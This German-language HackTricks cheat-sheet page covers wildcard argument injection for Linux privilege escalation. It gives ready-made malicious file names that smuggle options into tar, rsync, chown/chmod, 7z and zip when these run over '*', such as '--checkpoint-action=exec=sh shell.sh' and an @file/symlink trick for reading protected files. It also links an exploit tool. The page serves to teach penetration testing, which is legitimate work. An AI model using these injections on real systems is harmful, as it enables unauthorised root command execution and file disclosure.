{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}


## chown, chmod

Sie können **angeben, welchen Dateibesitzer und welche Berechtigungen Sie für den Rest der Dateien kopieren möchten**
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinierter Angriff)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Führen Sie beliebige Befehle aus:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Du kannst dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar-Angriff)_ ausnutzen.\
Mehr Informationen unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Führe beliebige Befehle aus:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_\
Mehr Infos in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** kann selbst die Verwendung von `--` vor `*` (beachten Sie, dass `--` bedeutet, dass die folgenden Eingaben nicht als Parameter behandelt werden können, sondern in diesem Fall nur als Dateipfade) einen beliebigen Fehler verursachen, um eine Datei zu lesen. Wenn also ein Befehl wie der folgende von root ausgeführt wird:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Und Sie können Dateien in dem Ordner erstellen, in dem dies ausgeführt wird. Sie könnten die Datei `@root.txt` und die Datei `root.txt` erstellen, die ein **symlink** zu der Datei ist, die Sie lesen möchten:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dann wird **7z**, wenn es ausgeführt wird, `root.txt` als eine Datei behandeln, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.

_Mehr Informationen in den Write-ups der Box CTF von HackTheBox._

## Zip

**Führe beliebige Befehle aus:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
